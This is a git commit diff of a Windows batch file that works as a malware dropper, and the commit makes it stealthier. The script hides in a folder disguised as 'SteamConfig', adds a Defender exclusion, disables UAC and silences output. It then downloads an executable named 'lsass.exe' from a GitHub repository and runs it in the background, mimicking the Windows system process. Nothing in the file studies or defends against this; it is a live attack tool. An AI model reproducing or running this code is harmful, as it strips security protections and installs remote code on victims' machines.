56bbfcadcd99520649d8224c8a2890b8bd5a722f
sirfedsalot <criticalshark@proton.me>
2025-02-21 03:16:37 -0600

    Update nasser-furz.bat

--- nasser-furz.bat
+++ nasser-furz.bat
@@ -1,18 +1,19 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set "folderPath=%USERPROFILE%\AppData\Local\RobloxApp"
+set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
 if not exist "%folderPath%" mkdir "%folderPath%"
 
-powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
 
-curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" 2> nul
+powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" >nul 2>&1
+
+curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
 if %errorlevel% neq 0 exit /b 1
 
 if not exist "%folderPath%\lsass.exe" exit /b 1
 for %%F in ("%folderPath%\lsass.exe") do set filesize=%%~zF
 if "%filesize%"=="0" exit /b 1
 
-start "" "%folderPath%\lsass.exe"
+start "" /b "%folderPath%\lsass.exe"
 exit
